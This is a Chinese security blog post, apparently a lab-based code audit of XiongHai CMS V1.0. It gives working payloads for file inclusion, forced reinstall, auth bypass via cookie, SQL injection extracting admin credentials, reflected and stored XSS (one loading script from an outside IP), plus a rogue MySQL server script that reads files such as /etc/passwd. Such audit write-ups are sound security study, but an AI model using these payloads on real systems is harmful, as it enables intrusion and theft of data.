<!DOCTYPE html><html lang="en" theme-mode="auto"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>跟着Y4师傅学代码审计-熊海CMS_V1.0 | RacerZ</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light' || window.matchMedia('(prefers-color-scheme:light)').matches) document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark' || window.matchMedia('(prefers-color-scheme:dark)').matches) document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>跟着Y4师傅学代码审计-熊海CMS_V1.0</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2022-11-30T16:00:00.000Z" id="date"> 2022-12-01</time></div></span><br><span>Last Update: <div class="control"><time datetime="2022-12-01T06:29:35.458Z" id="updated"> 2022-12-01</time></div></span></div></div><hr><div id="post-content"><h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>准备开始冲一下CNVD了，开启白盒审计阶段。这一篇练习分析熊海CMSV1.0，补充自己的一些trick和审计思路，加油！</p>
<p>这里会边适应申整套源码的思路，边同时扩展里面出现的知识点</p>
<h4 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h4><p><a target="_blank" rel="noopener" href="https://down.chinaz.com/search/%E7%86%8A%E6%B5%B7CMS.htm">https://down.chinaz.com/search/%E7%86%8A%E6%B5%B7CMS.htm</a> 站长之家下载源码。</p>
<p>这里选用phpstudy搭建CMS运行环境</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">php: 5.2.17<br>apache:<br>mysql: 5.5.53<br>windows: Windows 11 家庭中文版<br></code></pre></td></tr></table></figure>
<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>先拿自动化工具扫一下</p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221129232556955.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221129232556955.png" alt="image-20221129232556955"></p>
<p>好家伙331个，这误报率有点高</p>
<p>我们一个个来</p>
<h5 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h5><p>在根目录index.php中直接就存在一个文件包含，我们可以通过目录穿越包含根目录的文件(这里需要配合写文件或者文件上传一类)</p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221129233208496.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221129233208496.png" alt="image-20221129233208496"></p>
<p>例如我们在根目录写一个shell.php，其中包含<code>phpinfo()</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">r=../shell<br></code></pre></td></tr></table></figure>
<p>当然这里后缀有限制，我们特殊条件下也可以采用00截断，但现在不常见了就不展开了</p>
<blockquote>
<p> php 版本小于 5.3.4 而且GPC = Off 允许使用%00 </p>
</blockquote>
<p>admin目录下同样也存在一个，原理一致不再多说</p>
<h5 id="INSTALL安装逻辑问题"><a href="#INSTALL安装逻辑问题" class="headerlink" title="INSTALL安装逻辑问题"></a>INSTALL安装逻辑问题</h5><p>在<code>/install/index.php</code>中，判断网站是否已安装取决于当前目录是否存在<code>InstallLock.txt</code>文件，所以如果我们是利用前面所述的文件包含漏洞，在根目录包含<code>install/index.php</code>文件就会导致重装问题</p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201110203977.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201110203977.png" alt="image-20221201110203977"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">r=../install/index<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201110456956.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201110456956.png" alt="image-20221201110456956"></p>
<p>这里Y4是否提到了一个配合目录穿越读文件的利用</p>
<p>首先如果是在根目录去包含install文件的话是会出错的，因为其中会包含一个<code>../inc/db.class.php</code>文件。该文件如果在根目录包含是一定出错的。因此，我们需要找到一个<strong>保持相对路径相同</strong>包含点文件来利用</p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201112649470.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201112649470.png" alt="image-20221201112649470"></p>
<p><code>/admin/index.php</code>便是比较好利用的，这里看到当前文件与<code>/install/index.php</code>针对<code>/inc/conn.php</code>的相对路径是一样的，因此可以包含到正确文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">r=../../install/index<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201112831377.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201112831377.png" alt="image-20221201112831377"></p>
<p>进一步我们这里便可以利用恶意mysql服务端来读取任意文件</p>
<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2021/04/23/MySQL%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">https://www.mi1k7ea.com/2021/04/23/MySQL%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</a></p>
<p><strong>exp:</strong> 注意版本适配</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unhex</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">pack</span>(<span class="hljs-string">&quot;H*&quot;</span>, <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;#[^a-f0-9]+#si&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$str</span>)); &#125;<br><br><span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/etc/passwd&quot;</span>;<br><br><span class="hljs-variable">$srv</span> = <span class="hljs-title function_ invoke__">stream_socket_server</span>(<span class="hljs-string">&quot;tcp://0.0.0.0:1237&quot;</span>);<br><br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Enter filename to get [<span class="hljs-subst">$filename</span>] &gt; &quot;</span>;<br>  <span class="hljs-variable">$newFilename</span> = <span class="hljs-title function_ invoke__">rtrim</span>(<span class="hljs-title function_ invoke__">fgets</span>(STDIN), <span class="hljs-string">&quot;\r\n&quot;</span>);<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$newFilename</span>)) &#123;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$newFilename</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[.] Waiting for connection on 0.0.0.0:1237\n&quot;</span>;<br>  <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">stream_socket_accept</span>(<span class="hljs-variable">$srv</span>, -<span class="hljs-number">1</span>, <span class="hljs-variable">$peer</span>);<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+] Connection from <span class="hljs-subst">$peer</span> - greet... &quot;</span>;<br>  <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$s</span>, <span class="hljs-title function_ invoke__">unhex</span>(<span class="hljs-string">&#x27;45 00 00 00 0a 35 2e 31  2e 36 33 2d 30 75 62 75</span><br><span class="hljs-string">                    6e 74 75 30 2e 31 30 2e  30 34 2e 31 00 26 00 00</span><br><span class="hljs-string">                    00 7a 42 7a 60 51 56 3b  64 00 ff f7 08 02 00 00</span><br><span class="hljs-string">                    00 00 00 00 00 00 00 00  00 00 00 00 64 4c 2f 44</span><br><span class="hljs-string">                    47 77 43 2a 43 56 63 72  00                     &#x27;</span>));<br>  <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$s</span>, <span class="hljs-number">8192</span>);<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;auth ok... &quot;</span>;<br>  <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$s</span>, <span class="hljs-title function_ invoke__">unhex</span>(<span class="hljs-string">&#x27;07 00 00 02 00 00 00 02  00 00 00&#x27;</span>));<br>  <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$s</span>, <span class="hljs-number">8192</span>);<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;some shit ok... &quot;</span>;<br>  <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$s</span>, <span class="hljs-title function_ invoke__">unhex</span>(<span class="hljs-string">&#x27;07 00 00 01 00 00 00 00  00 00 00&#x27;</span>));<br>  <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$s</span>, <span class="hljs-number">8192</span>);<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;want file... &quot;</span>;<br>  <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$s</span>, <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) + <span class="hljs-number">1</span>) . <span class="hljs-string">&quot;\x00\x00\x01\xFB&quot;</span> . <span class="hljs-variable">$filename</span>);<br>  <span class="hljs-title function_ invoke__">stream_socket_shutdown</span>(<span class="hljs-variable">$s</span>, STREAM_SHUT_WR);<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+] <span class="hljs-subst">$filename</span> from <span class="hljs-subst">$peer</span>:\n&quot;</span>;<br><br>  <span class="hljs-variable">$len</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$s</span>, <span class="hljs-number">4</span>);<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$len</span>)) &#123;<br>    <span class="hljs-keyword">list</span> (, <span class="hljs-variable">$len</span>) = <span class="hljs-title function_ invoke__">unpack</span>(<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-variable">$len</span>);<br>    <span class="hljs-variable">$len</span> &amp;= <span class="hljs-number">0xffffff</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$len</span> &gt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-variable">$chunk</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$s</span>, <span class="hljs-variable">$len</span>);<br>      <span class="hljs-variable">$len</span> -= <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$chunk</span>);<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$chunk</span>;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n\n&quot;</span>;<br>  <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$s</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201114341966.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201114341966.png" alt="image-20221201114341966"></p>
<h5 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h5><p>inc目录下一般是配置文件，我们在checklogin.php中发现越权</p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221129234657636.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221129234657636.png" alt="image-20221129234657636"></p>
<p>很简单的一个越权，这里只检验了cookie的user字段是否为空</p>
<p>我们利用admin后台的其中一个页面<code>wzlist.php</code>做尝试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/admin/?r=wzlist<br>Cookie: user=whatever<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221129235210714.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221129235210714.png" alt="image-20221129235210714"></p>
<h5 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h5><p>/admin/files/login.php下，可以看到user参数被直接拼接，并且单引号闭合，还有报错提供</p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221129235904078.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221129235904078.png" alt="image-20221129235904078"></p>
<p>之后会去判断密码的md5值是否和数据库中查出的对应用户的密码相同。这里也说明密码在数据库中已md5哈希值存储</p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130223944666.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130223944666.png" alt="image-20221130223944666"></p>
<p>综上，这里的一种利用方式就是通过报错注入得到admin账户的密码，然后登录后台</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/admin/?r=login<br>user=-1&#x27; and updatexml(1,concat(0x23,database(),0x23),1) #        //xhcms_v1.0<br>user=-1&#x27; and updatexml(1,concat(0x23,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),32,32),0x23),1) #   //manage<br>user=-1&#x27; and updatexml(1,concat(0x23,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;manage&#x27;),1,32),0x23),1) <br>// id,user,name,password,img,mail,qq,date 8个字段<br>user=-1&#x27; and updatexml(1,concat(0x23,substr((select group_concat(user,password) from manage),1,32),0x23),1) # <br>// admin 21232f297a57a5a743894a0e4a801fc3<br><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130224839280.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130224839280.png" alt="image-20221130224839280"></p>
<p>拿到md5后去cmd5上解个密</p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130230504913.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130230504913.png" alt="image-20221130230504913"></p>
<p>这样既可获得admin账户的用户名密码</p>
<p>第二种方法就是sqlmap一把梭，原理是一样的（我这里没注出来）</p>
<p>第三种方法是Y4师傅说的利用联合查询造出假数据，只要满足回显1行，并且md5的原值可知即可，还有注意字段数保持一致，满足8个字段（第4个字段为密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">user=1&#x27; union select 1,2,&#x27;RacerZ&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;,5,6,7,8 #<br>password=1<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130232228795.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130232228795.png" alt="image-20221130232228795"></p>
<h5 id="后台SQL"><a href="#后台SQL" class="headerlink" title="后台SQL"></a>后台SQL</h5><p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130232615896.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130232615896.png" alt="image-20221130232615896"></p>
<p>关键词 <code>mysql_query</code></p>
<p>查看该文件，这里执行了一个删除操作，id字段参数可控，还是利用报错</p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130232815779.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130232815779.png" alt="image-20221130232815779"></p>
<p><strong>/admin/files/adset.php</strong></p>
<p>这里有一个<code>addslashes</code>限制，而且sql语句传参处加了引号，上下文也未作编码相关设置，所以没有宽字节注入的利用。</p>
<p>这里有一篇利用trick总结以后遇到再看 <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1077710">https://cloud.tencent.com/developer/article/1077710</a></p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130233148080.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130233148080.png" alt="image-20221130233148080"></p>
<p><strong>/admin/files/editcolumn.php</strong></p>
<p>在type参数控制下，下面俩分支均可SQL注入（id可控）</p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130234707544.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130234707544.png" alt="image-20221130234707544"></p>
<p>同时后面还有update操作也可控</p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130234835133.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221130234835133.png" alt="image-20221130234835133"></p>
<p><strong>/admin/files/imageset.php</strong></p>
<p>这个页面有个文件上传功能，上传位置可知</p>
<p>但是存在白名单过滤，仅能上传<code>jpg|jpeg|gif|bmp|png</code>后缀文件</p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201084817464.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201084817464.png" alt="image-20221201084817464"></p>
<p><strong>/files/content.php</strong></p>
<p>这里便是存在我们刚才说的addsalshes虽然加了，但是可以看到query那块的sql查询并没有使用引号包裹，那么我们直接查就可以了</p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201085501422.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201085501422.png" alt="image-20221201085501422"></p>
<p>同理在<strong>/files/software.php</strong>下也是这种情况</p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201085817340.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201085817340.png" alt="image-20221201085817340"></p>
<p>基本上存在表单的页面都有SQL注入hhhhhh。</p>
<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>在<strong>/files/contact.php页面中</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$page</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$page</span>&lt;&gt;<span class="hljs-string">&quot;&quot;</span>)&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$page</span>&lt;&gt;<span class="hljs-number">1</span>)&#123;<br><span class="hljs-variable">$pages</span>=<span class="hljs-string">&quot;第&quot;</span>.<span class="hljs-variable">$page</span>.<span class="hljs-string">&quot;页 - &quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>这里会接收page参数，并回显</p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201094836660.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201094836660.png" alt="image-20221201094836660"></p>
<p>一个典型的反射型XSS</p>
<p>最基本的payload，注意闭合a标签</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">page=&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a&gt;<br></code></pre></td></tr></table></figure>
<p>如果我们想回显更复杂的字符串，就需要绕开引号导致addslashes的限制</p>
<p>当然有个标签 SRC属性是可以不带引号的，尝试引入第三方js或第三方html页面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;SCRIPT SRC=http://43.140.198.45:81&gt;&lt;/SCRIPT&gt;<br>page=&lt;/a&gt;&lt;SCRIPT SRC=http://43.140.198.45:81/xss.js&gt;&lt;/SCRIPT&gt;&lt;a&gt;<br></code></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">page=&lt;/a&gt;&lt;script&gt;alert(/hacked by RacerZ/)&lt;/script&gt;&lt;a&gt;<br></code></pre></td></tr></table></figure>
<p>在<strong>/files/content.php</strong>中</p>
<p>id可控，cookie也可控</p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201102040479.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201102040479.png" alt="image-20221201102040479"></p>
<p>同时在前面，回显参数来自pinglun变量，该变量的值来自SQL查询interaction表，表名这里是否可利用存储型XSS，我们看下可提交存入数据库的参数是否存在过滤</p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201102440942.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201102440942.png" alt="image-20221201102440942"></p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201104054071.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201104054071.png" alt="image-20221201104054071"></p>
<p>这里可以看到能提交name，email，url，content等参数，并且提交至<code>/?r=submit&amp;type=comment&amp;cid=&lt;?php echo $id?&gt;</code>，看下该页面对content变量的值做了防护，其他参数都没啥过滤</p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201104301792.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201104301792.png" alt="image-20221201104301792"></p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201104227896.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201104227896.png" alt="image-20221201104227896"></p>
<p>再看看最终回显的参数有哪些，url和name参数是可回显的，url回显位置不太好在a标签的href处而且必须得包含<a target="_blank" rel="noopener" href="http://，可以尝试在name处注入payload">http://，可以尝试在name处注入payload</a></p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201104546482.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201104546482.png" alt="image-20221201104546482"></p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201104959496.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201104959496.png" alt="image-20221201104959496"></p>
<h5 id="验证码逻辑问题"><a href="#验证码逻辑问题" class="headerlink" title="验证码逻辑问题"></a>验证码逻辑问题</h5><p>我们在刚才的<code>/files/content.php</code>当中看到还引入了一个验证码</p>
